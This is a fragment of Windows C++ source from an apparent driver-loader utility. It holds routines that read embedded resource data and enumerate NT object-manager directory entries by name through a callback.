PBYTE DriverLoader::QueryResourceData(HMODULE hModule, ULONG_PTR ResourceId, LPWSTR Type, PULONG DataSize) {
	HRSRC res = FindResource(hModule, MAKEINTRESOURCE(ResourceId), Type);
	if (!res)
		return NULL;
	HGLOBAL resGlobal = LoadResource(NULL, res);
	DWORD size = SizeofResource(NULL, res);
	*DataSize = size;
	PBYTE pData = (PBYTE)LockResource(resGlobal);
	return pData;
}
//Lookup object by name in given directory.
NTSTATUS NTAPI DrvLdrEnumSystemObjects(_In_opt_ LPWSTR pwszRootDirectory, _In_opt_ HANDLE hRootDirectory,
	_In_ PENUMOBJECTSCALLBACK CallbackProc, _In_opt_ PVOID CallbackParam)
{
	BOOL                cond = TRUE;
	ULONG               ctx, rlen;
	HANDLE              hDirectory = NULL;
	NTSTATUS            status;
	NTSTATUS            CallbackStatus;
	OBJECT_ATTRIBUTES   attr;
	UNICODE_STRING      sname;

	POBJECT_DIRECTORY_INFORMATION    objinf;

	if (CallbackProc == NULL) {
		return STATUS_INVALID_PARAMETER_4;
	}

	status = STATUS_UNSUCCESSFUL;

	__try {

		// We can use root directory.
		if (pwszRootDirectory != NULL) {
			RtlSecureZeroMemory(&sname, sizeof(sname));
			RtlInitUnicodeString(&sname, pwszRootDirectory);
			InitializeObjectAttributes(&attr, &sname, OBJ_CASE_INSENSITIVE, NULL, NULL);
			status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &attr);
			if (!NT_SUCCESS(status)) {
				return status;
			}
		}
		else {
			if (hRootDirectory == NULL) {
				return STATUS_INVALID_PARAMETER_2;
			}
			hDirectory = hRootDirectory;
		}

		// Enumerate objects in directory.
		ctx = 0;
		do {

			rlen = 0;
			status = NtQueryDirectoryObject(hDirectory, NULL, 0, TRUE, FALSE, &ctx, &rlen);
			if (status != STATUS_BUFFER_TOO_SMALL)
				break;

			objinf = (POBJECT_DIRECTORY_INFORMATION)RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, rlen);
			if (objinf == NULL)
				break;

			status = NtQueryDirectoryObject(hDirectory, objinf, rlen, TRUE, FALSE, &ctx, &rlen);
			if (!NT_SUCCESS(status)) {
				RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, objinf);
				break;
			}

			CallbackStatus = CallbackProc(objinf, CallbackParam);

			RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, objinf);

			if (NT_SUCCESS(CallbackStatus)) {
				status = STATUS_SUCCESS;
				break;
			}

		} while (cond);

		if (hDirectory != NULL) {
			NtClose(hDirectory);
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = STATUS_ACCESS_VIOLATION;
	}

	return status;
}
//Comparer callback routine used in objects enumeration.
NTSTATUS NTAPI DetectObjectCallback(_In_ POBJECT_DIRECTORY_INFORMATION Entry, _In_ PVOID CallbackParam) {
	POBJSCANPARAM Param = (POBJSCANPARAM)CallbackParam;

	if (Entry == NULL) {
		return STATUS_INVALID_PARAMETER_1;
	}

	if (CallbackParam == NULL) {
		return STATUS_INVALID_PARAMETER_2;
	}

	if (Param->Buffer == NULL || Param->BufferSize == 0) {
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	if (Entry->Name.Buffer) {
		if (lstrcmp(Entry->Name.Buffer, Param->Buffer) == 0) {
			return STATUS_SUCCESS;
		}
	}
	return STATUS_UNSUCCESSFUL;
}